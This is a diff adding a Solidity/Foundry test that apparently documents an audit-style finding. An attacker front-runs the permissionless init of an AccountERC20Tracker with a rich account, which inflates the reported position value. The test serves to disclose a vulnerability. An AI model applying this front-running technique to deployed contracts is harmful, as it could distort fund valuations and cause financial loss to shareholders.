@@ -226,4 +226,41 @@ contract AccountERC20TrackerTest is Test, TestHelpers {
         int256 positionValue = tracker.getPositionValue();
         assertEq(positionValue, int256(totalValue));
     }
+
+    function test_permissionless_init_can_distort_valuation_if_added_before_init() public {
+        // New tracker not initialized yet
+        AccountERC20Tracker uninitialized = AccountERC20Tracker(
+            address(new AccountERC20TrackerHarness({_shares: address(shares)}))
+        );
+
+        // Admin mistakenly adds uninitialized tracker first
+        address valuationHandler = makeAddr("mockValuationHandler");
+        vm.prank(admin);
+        shares.setValuationHandler(valuationHandler);
+
+        // The valuation handler would sum tracker values; we assert that init can be front-run
+        // Attacker initializes with a rich account
+        address rich = makeAddr("rich");
+        MockERC20 token = new MockERC20(18);
+        token.mintTo(rich, 1_000_000e18);
+
+        uninitialized.init(rich);
+
+        // Now admin adds token as tracked asset
+        vm.prank(admin);
+        uninitialized.addAsset(address(token));
+
+        // Mock valuation handler conversion to return token balance as value 1:1
+        vm.mockCall(
+            valuationHandler,
+            abi.encodeWithSelector(
+                IValuationHandler.convertAssetAmountToValue.selector, address(token), token.balanceOf(rich)
+            ),
+            abi.encode(token.balanceOf(rich))
+        );
+
+        // Verify large positive value now attributed
+        int256 pos = uninitialized.getPositionValue();
+        assertEq(pos, int256(token.balanceOf(rich)));
+    }
 }
